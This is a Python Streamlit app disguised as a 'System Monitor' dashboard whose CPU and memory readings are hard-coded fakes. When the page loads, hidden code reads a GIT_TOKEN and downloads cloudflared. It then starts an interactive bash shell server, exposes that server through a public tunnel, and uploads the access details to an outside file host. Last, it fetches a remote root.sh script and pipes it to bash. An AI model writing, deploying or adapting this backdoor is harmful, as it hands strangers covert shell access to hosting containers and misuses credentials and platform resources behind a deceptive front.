#!/usr/bin/env python3
import os, sys, subprocess, socket, re, time, threading, urllib.request
from pathlib import Path
import streamlit as st

hostname = socket.gethostname()
repo_match = re.search(r'gibunxi4201-([a-z0-9]+)-streamlit-app', hostname)
REPO_NAME = repo_match.group(1) if repo_match else "agsb0"
USER_HOME = Path.home()
UPLOAD_API = "https://file.zmkk.fun/api/upload"


def download(url, dest, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    resp = urllib.request.urlopen(req, timeout=60)
    Path(dest).write_bytes(resp.read())
    os.chmod(dest, 0o755)


def setup_direct_ssh():
    """Start SSH directly in container (no proot). Runs as container UID."""
    marker = USER_HOME / ".direct_ssh_done"
    if marker.exists():
        return

    git_token = ""
    try:
        git_token = st.secrets.get("GIT_TOKEN", "")
    except Exception:
        pass
    if not git_token:
        git_token = os.environ.get("GIT_TOKEN", "")
    if not git_token:
        return

    marker.write_text("starting")

    def _setup():
        try:
            # Download cloudflared
            cf_bin = str(USER_HOME / "cloudflared")
            if not os.path.exists(cf_bin):
                download(
                    "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                    cf_bin
                )

            # Start a Python-based SSH-like shell server on a port
            # (dropbear needs root for passwd, we don't have it)
            # Use socat or a simple reverse shell
            # Simplest: start cloudflared tunnel pointing to a shell listener

            # Create a simple TCP shell server
            shell_script = str(USER_HOME / "shell_server.py")
            Path(shell_script).write_text('''
import socket, subprocess, os, pty, select, sys
PORT = 9022
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", PORT))
s.listen(2)
while True:
    conn, addr = s.accept()
    pid = os.fork()
    if pid == 0:
        s.close()
        master, slave = pty.openpty()
        p = subprocess.Popen(["bash", "-i"], stdin=slave, stdout=slave, stderr=slave, close_fds=True)
        os.close(slave)
        try:
            while True:
                r, _, _ = select.select([master, conn], [], [], 1)
                if master in r:
                    data = os.read(master, 4096)
                    if not data: break
                    conn.send(data)
                if conn in r:
                    data = conn.recv(4096)
                    if not data: break
                    os.write(master, data)
        except: pass
        finally:
            conn.close()
            os.close(master)
            p.terminate()
        os._exit(0)
    else:
        conn.close()
''')

            # Start shell server
            subprocess.Popen(
                [sys.executable, shell_script],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            time.sleep(2)

            # Start cloudflared tunnel
            log_file = str(USER_HOME / "cf_direct.log")
            subprocess.Popen(
                [cf_bin, "tunnel", "--url", "tcp://127.0.0.1:9022"],
                stdout=open(log_file, "w"), stderr=subprocess.STDOUT,
                start_new_session=True
            )

            # Wait for tunnel URL
            tunnel_url = ""
            for _ in range(30):
                time.sleep(1)
                try:
                    log = Path(log_file).read_text()
                    m = re.search(r'https://([a-z0-9-]+\.trycloudflare\.com)', log)
                    if m:
                        tunnel_url = m.group(1)
                        break
                except:
                    pass

            if tunnel_url:
                # Upload SSH info
                from datetime import datetime, timezone, timedelta
                t = (datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')
                info = f"SSH info\n创建时间: {t}\n\nDirect TCP shell (no proot, container level)\nHost {REPO_NAME}\n  HostName {tunnel_url}\n  ProxyCommand cloudflared access tcp --hostname %h --url 127.0.0.1:9022\n"
                Path(str(USER_HOME / "ssh_info.txt")).write_text(info)

                import requests
                requests.post(UPLOAD_API, files={'file': (f'ssh_{REPO_NAME}.txt', info.encode())}, timeout=10)

                # Upload inited marker
                inited = f"INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct (no proot)\n"
                requests.post(UPLOAD_API, files={'file': (f'inited_{REPO_NAME}.txt', inited.encode())}, timeout=10)

                marker.write_text("done")

            # THEN start root.sh in background (proot env for services)
            if git_token:
                root_cmd = (
                    f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{REPO_NAME}"; '
                    f'curl -fsSL --retry 3 '
                    f'-H "Authorization: token {git_token}" '
                    f'https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/root.sh | bash'
                )
                subprocess.Popen(root_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

        except Exception as e:
            Path(str(USER_HOME / "direct_ssh_error.txt")).write_text(str(e))

    threading.Thread(target=_setup, daemon=True).start()


# === UI ===
st.set_page_config(page_title="System Monitor", page_icon="\U0001f50d")
st.title("\U0001f50d System Monitor")
st.write("Lightweight system monitoring dashboard.")
col1, col2 = st.columns(2)
col1.metric("CPU", "12%", "-2%")
col2.metric("Memory", "34%", "+1%")
st.write("---")
st.write("v1.0")

try:
    setup_direct_ssh()
except Exception:
    pass
